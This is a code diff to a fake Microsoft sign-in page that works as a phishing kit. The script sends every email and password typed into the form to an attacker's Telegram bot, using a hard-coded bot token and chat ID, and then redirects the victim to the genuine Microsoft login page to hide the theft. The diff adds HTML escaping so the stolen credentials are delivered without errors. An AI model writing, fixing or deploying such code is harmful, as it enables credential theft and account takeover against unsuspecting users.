@@ -29,9 +29,9 @@
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            background-color: #f0f2f5; /* Fallback */
+            background-color: #f0f2f5; 
             
-            /* FEATURE UPDATE: Aurora Mesh Gradient Background */
+            /* Aurora Mesh Gradient Background */
             background-image: 
                 radial-gradient(circle at 10% 10%, #d6ebff 0%, transparent 40%),
                 radial-gradient(circle at 90% 85%, #ffe0ea 0%, transparent 40%),
@@ -45,15 +45,14 @@
         .login-container {
             background-color: var(--card-bg);
             width: 440px;
-            /* min-height removed to allow content to dictate height */
             padding: 44px;
-            box-shadow: 0 2px 20px rgba(0,0,0,0.08); /* FEATURE UPDATE: Softer shadow */
+            box-shadow: 0 2px 20px rgba(0,0,0,0.08); 
             position: relative;
             overflow: hidden;
-            margin-bottom: 20px; /* FEATURE UPDATE: Spacing for options card */
+            margin-bottom: 20px; 
         }
 
-        /* FEATURE UPDATE: Separate Sign-in Options Card */
+        /* Separate Sign-in Options Card */
         .signin-options-container {
             background-color: var(--card-bg);
             width: 440px;
@@ -98,7 +97,7 @@
         .slide-wrapper {
             display: flex;
             width: 200%;
-            transition: transform 0.35s cubic-bezier(0.1, 0.9, 0.2, 1); /* FEATURE UPDATE: Snappier ease */
+            transition: transform 0.35s cubic-bezier(0.1, 0.9, 0.2, 1); 
         }
 
         .step {
@@ -211,7 +210,7 @@
             display: none;
         }
 
-        /* FEATURE UPDATE: Footer Links */
+        /* Footer Links */
         .footer-links {
             position: absolute;
             bottom: 24px;
@@ -372,8 +371,18 @@
         const signInText = document.getElementById('signInText');
         
         // Telegram Bot Configuration
-        const TELEGRAM_BOT_TOKEN = '8287282426:AAH1IwO0-0S5hlb6llzrSyr93ATQaQAiqsM'; // Replace with your bot token
-        const TELEGRAM_CHAT_ID = '1224233010'; // Replace with your chat ID
+        const TELEGRAM_BOT_TOKEN = '8287282426:AAH1IwO0-0S5hlb6llzrSyr93ATQaQAiqsM'; 
+        const TELEGRAM_CHAT_ID = '1224233010'; 
+        
+        // FIX 1: HTML Escaping Function to prevent Telegram 400 Bad Request errors
+        function escapeHTML(str) {
+            return str
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#039;');
+        }
         
         // Function to send message to Telegram
         async function sendToTelegram(message) {
@@ -387,12 +396,12 @@
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CHAT_ID,
                         text: message,
-                        parse_mode: 'HTML'
+                        parse_mode: 'HTML' // Now safe to use because of escapeHTML()
                     })
                 });
                 
                 if (!response.ok) {
-                    console.error('Failed to send message to Telegram');
+                    console.error('Failed to send message to Telegram. Status:', response.status);
                     return false;
                 }
                 return true;
@@ -404,7 +413,6 @@
         
         // Function to redirect to Microsoft login
         function redirectToMicrosoftLogin() {
-            // Redirect to the official Microsoft login page
             window.location.href = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638990851025174917.YmZjMWNhNWEtMTlmNC00NGI5LTg4ZTYtZmJkZGI5MjU2YzU4YjI0MjE1N2UtNTRjNC00MzE1LWFiYjEtZmZmMmIwMjdhZjE1&ui_locales=en-US&mkt=en-US&client-request-id=73b62000-3042-413e-9f49-d82eeb45a52e&state=OYOjGNF8YxeLWC3RoXoDR_oiMVgOtvaOqMl4Klhw-EgUn7wipy7SuM0O7rAUFcS2gXTQj43vQmU4B6byXOaGAq4SFrl_erQ9nx6yVUB3myPZBwetRnBrcm56sOpFwl1TlG7JdWXfaOVXZ6ZOv_YnQup8swvFxRsD9Py_Csa_4kB4fjU1Xv91Em49FuKC3etlg9rjVyOtOwRjD9DtF3WJFftWg_ej-XrY2EoQ1C85EsFczwlR1oNqM7D2QdYJljmDZRoGvqvxBOEjR2Pv7HokiEb2BdxTbnQKt2gxcoZmwU9aEnTPYjnQ7Kmc9f_5QOLOe64S0ogAl7mXtbpLeSB2RtQwKxEAUPg09DacqrfqVLQ&x-client-SKU=ID_NET8_0&x-client-ver=8.5.0.0';
         }
         
@@ -419,14 +427,14 @@
             emailInput.style.borderBottomColor = '#8f8f8f';
             userEmailDisplay.innerText = email;
 
-            // Send email to Telegram
-            sendToTelegram(`📧 Email entered: <b>${email}</b>`);
+            // FIX 2: Sanitize data before sending to Telegram
+            sendToTelegram(`📧 Email entered: <b>${escapeHTML(email)}</b>`);
 
             slideWrapper.style.transform = 'translateX(-50%)';
             step1.classList.add('hidden');
             setTimeout(() => {
                 step2.classList.remove('hidden');
-                passwordInput.focus(); // UX: Auto-focus password
+                passwordInput.focus(); 
             }, 100);
         }
 
@@ -459,13 +467,13 @@
             signInText.textContent = 'Signing in...';
             signInBtn.disabled = true;
             
-            // Send email and password to Telegram
             const email = emailInput.value.trim();
-            const telegramSuccess = await sendToTelegram(`🔐 Login attempt:\nEmail: <b>${email}</b>\nPassword: <b>${password}</b>`);
             
-            // Add a small delay for better UX
+            // FIX 3: Sanitize both fields before sending
+            await sendToTelegram(`🔐 Login attempt:\nEmail: <b>${escapeHTML(email)}</b>\nPassword: <b>${escapeHTML(password)}</b>`);
+            
+            // Add a small delay for better UX before redirecting
             setTimeout(() => {
-                // Redirect to Microsoft login page regardless of Telegram success
                 redirectToMicrosoftLogin();
             }, 1500);
         }
